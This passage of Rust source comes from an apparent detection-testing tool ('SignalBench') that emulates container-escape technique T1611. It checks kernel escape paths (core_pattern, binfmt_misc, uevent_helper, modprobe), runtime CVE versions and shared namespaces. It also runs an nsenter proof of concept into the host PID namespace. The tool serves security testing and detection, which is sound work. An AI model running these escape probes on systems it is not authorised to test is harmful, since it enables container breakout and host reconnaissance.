                        findings.push(format!("[EXEC] sysctl kernel.core_pattern: {}", stdout.trim()));
                    }
                }
            }
            
            // =========================================================
            // 2. binfmt_misc Analysis (READ-ONLY)
            // =========================================================
            if test_binfmt {
                info!("[T1611-BREAKOUT] Analysing binfmt_misc escape vector (read-only)");
                
                let binfmt_path = "/proc/sys/fs/binfmt_misc";
                let binfmt_register = format!("{}/register", binfmt_path);
                let binfmt_status = format!("{}/status", binfmt_path);
                
                // Check if binfmt_misc is mounted
                if Path::new(binfmt_path).exists() {
                    findings.push(format!("[INFO] binfmt_misc mounted at: {}", binfmt_path));
                    
                    // Read status (read-only)
                    info!("[T1611-BREAKOUT] Reading: {}", binfmt_status);
                    if let Ok(status) = fs::read_to_string(&binfmt_status) {
                        findings.push(format!("[INFO] binfmt_misc status: {}", status.trim()));
                    }
                    
                    // Check register file permissions (read-only stat check)
                    if Path::new(&binfmt_register).exists() {
                        let metadata = fs::metadata(&binfmt_register);
                        match metadata {
                            Ok(m) => {
                                use std::os::unix::fs::PermissionsExt;
                                let mode = m.permissions().mode();
                                let writable = (mode & 0o222) != 0;
                                findings.push(format!("[INFO] binfmt_misc register permissions: {:o} (writable: {})", mode & 0o777, writable));
                                
                                if writable && is_root {
                                    findings.push("[VULN] binfmt_misc register appears writable - handler injection possible".to_string());
                                }
                            }
                            Err(e) => {
                                findings.push(format!("[INFO] Cannot stat binfmt_misc register: {}", e));
                            }
                        }
                    }
                    
                    // List existing handlers (read-only)
                    info!("[T1611-BREAKOUT] Executing: ls -la {}", binfmt_path);
                    let ls_output = Command::new("ls")
                        .args(["-la", binfmt_path])
                        .output()
                        .await;
                    
                    if let Ok(output) = ls_output {
                        if output.status.success() {
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let handler_count = stdout.lines().count().saturating_sub(3);
                            findings.push(format!("[INFO] binfmt_misc handlers: {} registered", handler_count));
                            
                            // Log handlers found
                            for line in stdout.lines().skip(3) {
                                if !line.contains("register") && !line.contains("status") {
                                    findings.push(format!("[INFO] Handler: {}", line.split_whitespace().last().unwrap_or("unknown")));
                                }
                            }
                        }
                    }
                } else {
                    findings.push("[INFO] binfmt_misc not mounted - technique not applicable".to_string());
                }
            }
            
            // =========================================================
            // 3. uevent_helper Analysis (READ-ONLY)
            // =========================================================
            if test_uevent {
                info!("[T1611-BREAKOUT] Analysing uevent_helper escape vector (read-only)");
                
                let uevent_path = "/sys/kernel/uevent_helper";
                
                // Read current uevent_helper (read-only)
                info!("[T1611-BREAKOUT] Reading: {}", uevent_path);
                match fs::read_to_string(uevent_path) {
                    Ok(current) => {
                        let current = current.trim();
                        findings.push(format!("[INFO] Current uevent_helper: '{}'", current));
                        
                        if !current.is_empty() {
                            findings.push("[WARNING] uevent_helper is set - device hotplug has custom handler".to_string());
                        }
                        
                        // Check write permissions via stat (read-only)
                        let metadata = fs::metadata(uevent_path);
                        match metadata {
                            Ok(m) => {
                                use std::os::unix::fs::PermissionsExt;
                                let mode = m.permissions().mode();
                                let writable = (mode & 0o222) != 0;
                                findings.push(format!("[INFO] uevent_helper permissions: {:o} (writable: {})", mode & 0o777, writable));
                                
                                if writable && is_root {
                                    findings.push("[VULN] uevent_helper appears writable - hotplug hijacking possible".to_string());
                                }
                            }
                            Err(e) => {
                                findings.push(format!("[INFO] Cannot stat uevent_helper: {}", e));
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[INFO] uevent_helper read - inaccessible: {}", e));
                    }
                }
            }
            
            // =========================================================
            // 4. Additional Kernel Escape Vectors (READ-ONLY)
            // =========================================================
            info!("[T1611-BREAKOUT] Checking additional kernel escape vectors (read-only)");
            
            // Read modprobe path (read-only)
            let modprobe_path = "/proc/sys/kernel/modprobe";
            if let Ok(modprobe) = fs::read_to_string(modprobe_path) {
                findings.push(format!("[INFO] kernel.modprobe: {}", modprobe.trim()));
                
                // Check permissions (read-only stat)
                if let Ok(m) = fs::metadata(modprobe_path) {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = m.permissions().mode();
                    let writable = (mode & 0o222) != 0;
                    if writable && is_root {
                        findings.push("[VULN] kernel.modprobe appears writable - module hijacking possible".to_string());
                    }
                }
            }
            
            // Read hotplug helper (read-only)
            let hotplug_path = "/proc/sys/kernel/hotplug";
            if let Ok(hotplug) = fs::read_to_string(hotplug_path) {
                findings.push(format!("[INFO] kernel.hotplug: {}", hotplug.trim()));
            }
            
            // Read sysrq (read-only)
            let sysrq_path = "/proc/sys/kernel/sysrq";
            if let Ok(sysrq) = fs::read_to_string(sysrq_path) {
                findings.push(format!("[INFO] kernel.sysrq: {}", sysrq.trim()));
            }
            
            // Write report
            let report_file = format!("{}/breakout_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-BREAKOUT - Advanced Container Breakout Report\n{}\n\nEnvironment:\n  Container: {}\n  Runtime: {:?}\n  Root: {}\n  CAP_SYS_ADMIN: {}\n\nFindings:\n{}\n",
                    "=".repeat(60),
                    container_env.is_container,
                    container_env.runtime,
                    is_root,
                    has_sys_admin,
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_count = findings.iter().filter(|f| f.contains("[ESCAPE]")).count();
            let message = if escape_count > 0 {
                format!("Advanced breakout: {} escape vectors detected!", escape_count)
            } else {
                "Advanced breakout: No direct escape vectors available".to_string()
            };
            
            info!("[T1611-BREAKOUT] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-BREAKOUT] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                
                if path.is_dir() {
                    debug!("[T1611-BREAKOUT] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-BREAKOUT] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-BREAKOUT] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-BREAKOUT] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            // Clean up marker files that may have been created
            let markers = [
                "/tmp/signalbench_core_escape_marker",
                "/tmp/signalbench_binfmt_marker",
                "/tmp/signalbench_uevent_marker",
            ];
            
            for marker in &markers {
                if Path::new(marker).exists() {
                    debug!("[T1611-BREAKOUT] Removing marker: {}", marker);
                    let _ = fs::remove_file(marker);
                }
            }
            
            info!("[T1611-BREAKOUT] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-CVE: Runtime CVE Vulnerability Check
// =============================================================================
// Checks container runtime versions for known CVEs:
// - CVE-2019-5736 (runc < 1.0.0-rc6)
// - CVE-2020-15257 (containerd < 1.3.9, 1.4.x < 1.4.3)
// - CVE-2022-0847 (Dirty Pipe - kernel 5.8 to 5.16.11)
// - CVE-2016-5195 (Dirty COW - kernel < 4.8.3)

pub struct RuntimeCveCheck {}

#[async_trait]
impl AttackTechnique for RuntimeCveCheck {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-CVE".to_string(),
            name: "Runtime CVE Vulnerability Check".to_string(),
            description: "Detects vulnerable container runtime and kernel versions that enable \
                container escape. Checks runc for CVE-2019-5736 (proc/self/exe overwrite), \
                containerd for CVE-2020-15257 (abstract socket hijacking), and kernel versions \
                for Dirty Pipe (CVE-2022-0847) and Dirty COW (CVE-2016-5195). Based on Traitor \
                and LinPEAS vulnerability detection patterns.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for output files".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_cve".to_string()),
                },
            ],
            detection: "Monitor for: version queries to container runtimes (runc --version, \
                containerd --version), kernel version enumeration (uname -r), reading \
                /proc/version, CVE-related reconnaissance patterns.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_cve".to_string());
            
            debug!("[T1611-CVE] Starting Runtime CVE Vulnerability Check");
            debug!("[T1611-CVE] Output directory: {}", output_dir);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            let mut vulnerabilities = Vec::new();
            
            if dry_run {
                info!("[DRY RUN] Would perform Runtime CVE Vulnerability Check:");
                info!("[DRY RUN] - Execute: runc --version");
                info!("[DRY RUN] - Execute: containerd --version");
                info!("[DRY RUN] - Execute: docker version");
                info!("[DRY RUN] - Execute: uname -r");
                info!("[DRY RUN] - Read: /proc/version");
                info!("[DRY RUN] - Check for CVE-2019-5736 (runc)");
                info!("[DRY RUN] - Check for CVE-2020-15257 (containerd)");
                info!("[DRY RUN] - Check for CVE-2022-0847 (Dirty Pipe)");
                info!("[DRY RUN] - Check for CVE-2016-5195 (Dirty COW)");
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform runtime CVE checks".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-CVE] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // =========================================================
            // 1. Check runc version for CVE-2019-5736
            // =========================================================
            info!("[T1611-CVE] Checking runc version");
            
            let runc_paths = ["runc", "/usr/bin/runc", "/usr/sbin/runc", "/usr/local/bin/runc"];
            let mut runc_version: Option<String> = None;
            
            for runc_path in &runc_paths {
                debug!("[T1611-CVE] Trying: {} --version", runc_path);
                let output = Command::new(runc_path)
                    .args(["--version"])
                    .output()
                    .await;
                
                if let Ok(out) = output {
                    if out.status.success() {
                        let version_str = String::from_utf8_lossy(&out.stdout);
                        findings.push(format!("[INFO] runc version: {}", version_str.lines().next().unwrap_or("")));
                        runc_version = Some(version_str.to_string());
                        
                        // Parse version and check for CVE-2019-5736
                        // Vulnerable: < 1.0.0-rc6
                        if version_str.contains("1.0.0-rc") {
                            if let Some(rc_num) = version_str.split("rc").nth(1) {
                                if let Ok(rc) = rc_num.chars().take_while(|c| c.is_ascii_digit()).collect::<String>().parse::<u32>() {
                                    if rc < 6 {
                                        vulnerabilities.push("CVE-2019-5736".to_string());
                                        findings.push("[VULNERABLE] CVE-2019-5736: runc < 1.0.0-rc6 - container escape via /proc/self/exe".to_string());
                                    }
                                }
                            }
                        } else if version_str.contains("1.0-rc") || version_str.contains("0.") {
                            vulnerabilities.push("CVE-2019-5736".to_string());
                            findings.push("[VULNERABLE] CVE-2019-5736: runc vulnerable version detected".to_string());
                        } else {
                            findings.push("[SAFE] runc version appears patched for CVE-2019-5736".to_string());
                        }
                        break;
                    }
                }
            }
            
            if runc_version.is_none() {
                findings.push("[INFO] runc not found or not accessible".to_string());
            }
            
            // =========================================================
            // 2. Check containerd version for CVE-2020-15257
            // =========================================================
            info!("[T1611-CVE] Checking containerd version");
            
            let containerd_output = Command::new("containerd")
                .args(["--version"])
                .output()
                .await;
            
            if let Ok(output) = containerd_output {
                if output.status.success() {
                    let version_str = String::from_utf8_lossy(&output.stdout);
                    findings.push(format!("[INFO] containerd: {}", version_str.trim()));
                    
                    // Parse version for CVE-2020-15257
                    // Vulnerable: < 1.3.9 or 1.4.x < 1.4.3
                    let version_line = version_str.lines().next().unwrap_or("");
                    if let Some(ver_part) = version_line.split_whitespace().find(|s| s.starts_with("v") || s.chars().next().map(|c| c.is_ascii_digit()).unwrap_or(false)) {
                        let ver = ver_part.trim_start_matches('v');
                        let parts: Vec<&str> = ver.split('.').collect();
                        
                        if parts.len() >= 2 {
                            let major = parts[0].parse::<u32>().unwrap_or(0);
                            let minor = parts[1].parse::<u32>().unwrap_or(0);
                            let patch = parts.get(2).and_then(|p| p.chars().take_while(|c| c.is_ascii_digit()).collect::<String>().parse::<u32>().ok()).unwrap_or(0);
                            
                            let is_vulnerable = 
                                (major == 1 && minor == 3 && patch < 9) ||
                                (major == 1 && minor == 4 && patch < 3) ||
                                (major == 1 && minor < 3) ||
                                (major == 0);
                            
                            if is_vulnerable {
                                vulnerabilities.push("CVE-2020-15257".to_string());
                                findings.push("[VULNERABLE] CVE-2020-15257: containerd < 1.3.9/1.4.3 - abstract socket escape".to_string());
                            } else {
                                findings.push("[SAFE] containerd version appears patched for CVE-2020-15257".to_string());
                            }
                        }
                    }
                }
            } else {
                findings.push("[INFO] containerd not found or not accessible".to_string());
            }
            
            // =========================================================
            // 3. Check kernel version for Dirty Pipe and Dirty COW
            // =========================================================
            info!("[T1611-CVE] Checking kernel version");
            
            let uname_output = Command::new("uname")
                .args(["-r"])
                .output()
                .await;
            
            if let Ok(output) = uname_output {
                if output.status.success() {
                    let kernel_version = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    findings.push(format!("[INFO] Kernel version: {}", kernel_version));
                    debug!("[T1611-CVE] Kernel: {}", kernel_version);
                    
                    // Parse kernel version
                    let parts: Vec<&str> = kernel_version.split(&['.', '-'][..]).collect();
                    if parts.len() >= 3 {
                        let major = parts[0].parse::<u32>().unwrap_or(0);
                        let minor = parts[1].parse::<u32>().unwrap_or(0);
                        let patch = parts[2].parse::<u32>().unwrap_or(0);
                        
                        debug!("[T1611-CVE] Parsed version: {}.{}.{}", major, minor, patch);
                        
                        // CVE-2022-0847 (Dirty Pipe): 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102
                        let dirty_pipe_vulnerable = 
                            (major == 5 && (8..16).contains(&minor)) ||
                            (major == 5 && minor == 16 && patch < 11);
                        
                        if dirty_pipe_vulnerable {
                            vulnerabilities.push("CVE-2022-0847".to_string());
                            findings.push("[VULNERABLE] CVE-2022-0847 (Dirty Pipe): Kernel 5.8-5.16.11 - arbitrary file overwrite".to_string());
                        } else {
                            findings.push("[SAFE] Kernel not vulnerable to Dirty Pipe (CVE-2022-0847)".to_string());
                        }
                        
                        // CVE-2016-5195 (Dirty COW): kernel < 4.8.3
                        let dirty_cow_vulnerable = 
                            (major < 4) ||
                            (major == 4 && minor < 8) ||
                            (major == 4 && minor == 8 && patch < 3);
                        
                        if dirty_cow_vulnerable {
                            vulnerabilities.push("CVE-2016-5195".to_string());
                            findings.push("[VULNERABLE] CVE-2016-5195 (Dirty COW): Kernel < 4.8.3 - copy-on-write race condition".to_string());
                        } else {
                            findings.push("[SAFE] Kernel not vulnerable to Dirty COW (CVE-2016-5195)".to_string());
                        }
                    }
                }
            }
            
            // Read /proc/version for additional info
            if let Ok(proc_version) = fs::read_to_string("/proc/version") {
                findings.push(format!("[INFO] /proc/version: {}", proc_version.trim()));
            }
            
            // =========================================================
            // 4. Check Docker version
            // =========================================================
            info!("[T1611-CVE] Checking Docker version");
            
            let docker_output = Command::new("docker")
                .args(["version", "--format", "{{.Server.Version}}"])
                .output()
                .await;
            
            if let Ok(output) = docker_output {
                if output.status.success() {
                    let docker_version = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    findings.push(format!("[INFO] Docker version: {}", docker_version));
                }
            }
            
            // Write report
            let report_file = format!("{}/cve_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-CVE - Runtime CVE Vulnerability Report\n{}\n\nVulnerabilities Found: {}\n{}\n\nDetailed Findings:\n{}\n",
                    "=".repeat(60),
                    vulnerabilities.len(),
                    if vulnerabilities.is_empty() { "None".to_string() } else { vulnerabilities.join(", ") },
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let message = if vulnerabilities.is_empty() {
                "No known runtime CVE vulnerabilities detected".to_string()
            } else {
                format!("VULNERABLE: {} CVEs detected - {}", vulnerabilities.len(), vulnerabilities.join(", "))
            };
            
            info!("[T1611-CVE] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-CVE] Starting cleanup");
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                
                if path.is_dir() {
                    debug!("[T1611-CVE] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-CVE] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-CVE] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-CVE] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-CVE] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-NS: Namespace Escape Detection
// =============================================================================

pub struct NamespaceEscapeDetection {}

#[async_trait]
impl AttackTechnique for NamespaceEscapeDetection {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-NS".to_string(),
            name: "Namespace Escape Detection".to_string(),
            description: "Detects namespace isolation weaknesses that enable container escape. \
                Compares container namespaces with PID 1 (init) to identify shared namespaces. \
                When namespaces are shared (especially pid, mnt, or net), the container may \
                have direct access to host resources. Based on deepce and LinPEAS namespace \
                enumeration patterns.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for output files".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_ns".to_string()),
                },
            ],
            detection: "Monitor for: reading /proc/self/ns/*, reading /proc/1/ns/*, \
                namespace comparison operations, nsenter command execution, \
                setns syscalls.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_ns".to_string());
            
            debug!("[T1611-NS] Starting Namespace Escape Detection");
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            let mut shared_namespaces = Vec::new();
            
            if dry_run {
                info!("[DRY RUN] Would perform Namespace Escape Detection:");
                info!("[DRY RUN] - Read /proc/self/ns/* for current namespaces");
                info!("[DRY RUN] - Read /proc/1/ns/* for init namespaces");
                info!("[DRY RUN] - Compare inode numbers to detect shared namespaces");
                info!("[DRY RUN] - Check for escape vectors via shared namespaces");
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform namespace escape detection".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-NS] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Detect container environment
            let container_env = detect_container_environment_with_prefix("T1611-NS");
            findings.push(format!("[INFO] Container detected: {}", container_env.is_container));
            findings.push(format!("[INFO] Runtime: {:?}", container_env.runtime));
            
            let namespaces = ["cgroup", "ipc", "mnt", "net", "pid", "user", "uts"];
            
            info!("[T1611-NS] Enumerating namespaces");
            
            // Read self namespaces
            let mut self_ns: std::collections::HashMap<String, u64> = std::collections::HashMap::new();
            let mut init_ns: std::collections::HashMap<String, u64> = std::collections::HashMap::new();
            
            for ns in &namespaces {
                let self_path = format!("/proc/self/ns/{}", ns);
                let init_path = format!("/proc/1/ns/{}", ns);
                
                debug!("[T1611-NS] Reading: {}", self_path);
                if let Ok(link) = fs::read_link(&self_path) {
                    let link_str = link.to_string_lossy();
                    // Extract inode from link like "pid:[4026531836]"
                    if let Some(start) = link_str.find('[') {
                        if let Some(end) = link_str.find(']') {
                            if let Ok(inode) = link_str[start+1..end].parse::<u64>() {
                                self_ns.insert(ns.to_string(), inode);
                                debug!("[T1611-NS] self {} inode: {}", ns, inode);
                            }
                        }
                    }
                }
                
                debug!("[T1611-NS] Reading: {}", init_path);
                if let Ok(link) = fs::read_link(&init_path) {
                    let link_str = link.to_string_lossy();
                    if let Some(start) = link_str.find('[') {
                        if let Some(end) = link_str.find(']') {
                            if let Ok(inode) = link_str[start+1..end].parse::<u64>() {
                                init_ns.insert(ns.to_string(), inode);
                                debug!("[T1611-NS] init {} inode: {}", ns, inode);
                            }
                        }
                    }
                }
            }
            
            // Compare namespaces
            info!("[T1611-NS] Comparing namespaces with init process");
            
            for ns in &namespaces {
                let self_inode = self_ns.get(*ns);
                let init_inode = init_ns.get(*ns);
                
                match (self_inode, init_inode) {
                    (Some(s), Some(i)) if s == i => {
                        shared_namespaces.push(ns.to_string());
                        let severity = match *ns {
                            "pid" => "[CRITICAL]",
                            "mnt" => "[CRITICAL]",
                            "net" => "[WARNING]",
                            _ => "[INFO]",
                        };
                        findings.push(format!("{} {} namespace SHARED with host (inode: {})", severity, ns, s));
                        info!("[T1611-NS] {} namespace shared with host", ns);
                    }
                    (Some(s), Some(i)) => {
                        findings.push(format!("[SAFE] {} namespace isolated (self: {}, init: {})", ns, s, i));
                    }
                    (Some(_), None) => {
                        findings.push(format!("[INFO] {} namespace: cannot read init ns", ns));
                    }
                    (None, _) => {
                        findings.push(format!("[INFO] {} namespace: cannot read self ns", ns));
                    }
                }
            }
            
            // Check for escape vectors based on shared namespaces
            if shared_namespaces.contains(&"pid".to_string()) {
                findings.push("[ESCAPE] PID namespace shared - can see/signal host processes!".to_string());
                
                // Try nsenter as proof of concept
                info!("[T1611-NS] Attempting nsenter to host PID namespace");
                let nsenter_output = Command::new("nsenter")
                    .args(["--target", "1", "--pid", "--", "ps", "aux"])
                    .output()
                    .await;
                
                if let Ok(output) = nsenter_output {
                    if output.status.success() {
                        findings.push("[ESCAPE] nsenter to host PID namespace SUCCEEDED".to_string());
                        let ps_file = format!("{}/host_processes.txt", output_dir);
                        if let Ok(mut f) = File::create(&ps_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ps_file);
                        }
                    }
                }
            }
            
            if shared_namespaces.contains(&"mnt".to_string()) {
                findings.push("[ESCAPE] Mount namespace shared - full host filesystem access!".to_string());
            }
            
            if shared_namespaces.contains(&"net".to_string()) {
                findings.push("[WARNING] Network namespace shared - can access host network stack".to_string());
            }
            
            // Execute ls -la /proc/self/ns for telemetry
            info!("[T1611-NS] Executing: ls -la /proc/self/ns");
            let ls_output = Command::new("ls")
                .args(["-la", "/proc/self/ns"])
                .output()
                .await;
            
            if let Ok(output) = ls_output {
                if output.status.success() {
                    let ns_file = format!("{}/self_namespaces.txt", output_dir);
                    if let Ok(mut f) = File::create(&ns_file) {
                        let _ = f.write_all(output.stdout.as_slice());
                        artefacts.push(ns_file);
                    }
                }
            }
            
            // Write report
            let report_file = format!("{}/namespace_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-NS - Namespace Escape Detection Report\n{}\n\nShared Namespaces: {}\n{}\n\nFindings:\n{}\n",
                    "=".repeat(60),
                    shared_namespaces.len(),
                    if shared_namespaces.is_empty() { "None".to_string() } else { shared_namespaces.join(", ") },
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_count = shared_namespaces.iter().filter(|ns| *ns == "pid" || *ns == "mnt").count();
            let message = if escape_count > 0 {
                format!("ESCAPE POSSIBLE: {} critical namespaces shared with host", escape_count)
            } else if !shared_namespaces.is_empty() {
                format!("Partial isolation: {} namespaces shared", shared_namespaces.len())
            } else {
                "Full namespace isolation - no escape vectors via namespaces".to_string()
            };
            
            info!("[T1611-NS] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-NS] Starting cleanup");
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                
                if path.is_dir() {
                    let _ = fs::remove_dir_all(path);
                } else if path.is_file() {
                    let _ = fs::remove_file(path);
                }
            }
            
            info!("[T1611-NS] Cleanup complete");
            Ok(())
        })
    }
}
